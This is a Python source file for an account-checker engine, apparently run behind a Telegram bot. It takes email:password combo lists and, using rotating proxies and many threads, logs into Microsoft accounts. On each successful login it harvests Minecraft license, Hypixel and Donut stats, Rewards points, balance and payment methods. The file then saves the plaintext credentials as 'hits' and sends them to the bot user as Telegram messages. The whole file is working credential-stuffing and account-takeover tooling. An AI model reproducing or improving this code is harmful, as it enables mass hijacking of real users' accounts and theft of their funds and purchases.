import requests
import threading
import time
import random
import os
import zipfile
import asyncio
from datetime import datetime
from proxy_parser import parse_proxy
from login_helper import microsoft_login
import minecraft_checker
import hypixel_stats
import balance as balance_checker
import donut_stats as donut_checker
import payment_methods as payment_checker
import rewardpoints as reward_checker

class CheckerEngine:
    def __init__(self, user_id, combo_list, proxy_list, threads, settings, db, bot, loop):
        self.user_id = user_id
        self.combo_list = combo_list
        self.proxy_list = [parse_proxy(p) for p in proxy_list if parse_proxy(p)]
        self.threads = threads
        self.settings = settings
        self.db = db
        self.bot = bot
        self.loop = loop

        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.checked = 0
        self.total = len(combo_list)
        self.start_time = time.time()
        self.is_running = True

        self.results_dir = f"results/{user_id}_{int(self.start_time)}"
        os.makedirs(self.results_dir, exist_ok=True)
        self.lock = threading.Lock()

        # Files for results
        self.files = {
            'hits': open(f"{self.results_dir}/hits.txt", "a"),
            'bad': open(f"{self.results_dir}/bad.txt", "a"),
            'errors': open(f"{self.results_dir}/errors.txt", "a")
        }

    def get_proxy(self):
        if not self.proxy_list:
            return None
        return random.choice(self.proxy_list)

    def write_result(self, file_type, content):
        with self.lock:
            self.files[file_type].write(content + "\n")
            self.files[file_type].flush()

    async def update_ui(self, msg_obj):
        while self.is_running:
            if self.checked >= self.total and self.total > 0:
                break

            elapsed = time.time() - self.start_time
            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total) * 100 if self.total > 0 else 0

            # Progress bar
            bar_len = 15
            filled_len = int(bar_len * progress / 100)
            bar = '🟩' * filled_len + '⬜' * (bar_len - filled_len)

            text = (
                f"🚀 <b>Checking Progress</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>Stats:</b>\n"
                f"✅ Hits: {self.hits}\n"
                f"❌ Bad: {self.bad}\n"
                f"⚠️ Errors: {self.errors}\n"
                f"🔄 Checked: {self.checked}/{self.total}\n"
                f"📈 Progress: [{bar}] {progress:.1f}%\n"
                f"⚡ CPM: {cpm}\n"
                f"⏱ Elapsed: {int(elapsed)}s\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Credits: @akaza_isnt"
            )
            try:
                await msg_obj.edit_text(text, parse_mode="HTML")
            except:
                pass
            await asyncio.sleep(5)

    def write_result_wrapper(self, fname, filename, content):
        with self.lock:
            with open(f"{self.results_dir}/{filename}", "a", encoding='utf-8') as f:
                f.write(content)

    def check_account(self, combo):
        if ":" not in combo:
            with self.lock: self.errors += 1
            self.checked += 1
            return

        email, password = combo.split(":", 1)
        session = requests.Session()
        session.proxies = self.get_proxy()

        try:
            token, xbox_token = microsoft_login(session, email, password)

            if token == "2FA":
                self.write_result('errors', f"{email}:{password} (2FA)")
                with self.lock: self.errors += 1
                self.db.update_stats(self.user_id, errors=1)
                return

            if not token:
                self.write_result('bad', f"{email}:{password}")
                with self.lock: self.bad += 1
                self.db.update_stats(self.user_id, bad=1)
                return

            # Capture Logic
            capture_data = []

            # Minecraft License
            has_mc = minecraft_checker.checkmc(
                session, email, password, token, xbox_token,
                {'timeout': 10}, self.proxy_list, 3, self.get_proxy,
                [0], [0], [0], [0], [0], [0], [0],
                self.lock, self.results_dir, self.write_result_wrapper,
                None, lambda *args: None, lambda *args: None
            )

            # Hypixel Stats
            try:
                profilerq = session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers={'Authorization': f'Bearer {token}'},
                    timeout=10
                )
                if profilerq.status_code == 200:
                    p_data = profilerq.json()
                    username = p_data.get('name', 'N/A')
                    uuid = p_data.get('id', 'N/A')

                    hypixel = hypixel_stats.fetch_hypixel_stats(username, uuid)
                    if hypixel: capture_data.append(f"Hypixel: {hypixel}")

                    # Donut Stats
                    donut_checker.fetch_donut_stats(username, email, password, None, self.results_dir, self.lock, {'donut_stats': True}, self.get_proxy, 'http')
                else:
                    username = 'N/A'
            except:
                username = 'N/A'

            # Rewards
            points = reward_checker.fetch_rewards(session, email, password, {'check_rewards_points': True}, self.results_dir, self.write_result_wrapper)
            if points: capture_data.append(f"Rewards: {points} points")

            # Balance
            balance = balance_checker.fetch_balance(session, email, password, {'check_microsoft_balance': True}, self.results_dir, self.write_result_wrapper)
            if balance: capture_data.append(f"Balance: {balance}")

            # Payment Methods
            payment_checker.fetch_payment_methods(session, email, password, {'check_payment': True}, self.results_dir, self.lock, self.write_result_wrapper)

            # Final Hit Processing
            full_capture = " | ".join(capture_data)
            hit_msg = f"{email}:{password} | {full_capture}"
            self.write_result('hits', hit_msg)
            with self.lock: self.hits += 1

            # Update DB stats
            self.db.update_stats(self.user_id, hits=1)

            # Send instant notification if enabled (setting index 1 is hit_notifications)
            # Fetch settings fresh to be sure
            current_settings = self.db.get_settings(self.user_id)
            if current_settings and current_settings[1]:
                self.loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(self.bot.send_message(self.user_id, f"🎯 <b>HIT!</b>\n<code>{hit_msg}</code>\n\nCredits: @akaza_isnt", parse_mode="HTML"))
                )

        except Exception as e:
            self.write_result('errors', f"{email}:{password} ({str(e)})")
            with self.lock: self.errors += 1
            self.db.update_stats(self.user_id, errors=1)
        finally:
            with self.lock: self.checked += 1

    def run_worker(self):
        while self.is_running:
            combo = None
            with self.lock:
                if self.combo_list:
                    combo = self.combo_list.pop(0)
                else:
                    break
            if combo:
                self.check_account(combo)

    def start(self):
        threads_list = []
        for _ in range(min(self.threads, len(self.combo_list))):
            t = threading.Thread(target=self.run_worker)
            t.start()
            threads_list.append(t)

        for t in threads_list:
            t.join()

        self.is_running = False
        for f in self.files.values():
            f.close()

    def get_results_zip(self):
        zip_path = f"{self.results_dir}.zip"
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(self.results_dir):
                for file in files:
                    if file.endswith('.txt'):
                        zipf.write(os.path.join(root, file), file)
        return zip_path
